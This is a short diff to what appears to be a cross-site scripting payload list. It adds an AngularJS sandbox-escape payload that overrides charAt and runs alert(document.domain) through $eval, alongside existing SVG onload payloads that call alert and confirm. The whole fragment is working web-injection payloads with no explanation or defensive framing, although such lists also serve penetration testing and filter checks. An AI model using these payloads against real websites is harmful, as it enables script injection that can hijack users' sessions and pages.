@@ -1,3 +1,4 @@
+{{'tester'.constructor.prototype.charAt=[].join;$eval('test=test} } };alert(document.domain)//');}}
 <Svg%20One%20OnLoad=alert\(1\)\>
 '"<Svg%20One%20OnLoad=confirm\(1\)\>
 <svg/onload=alert()>
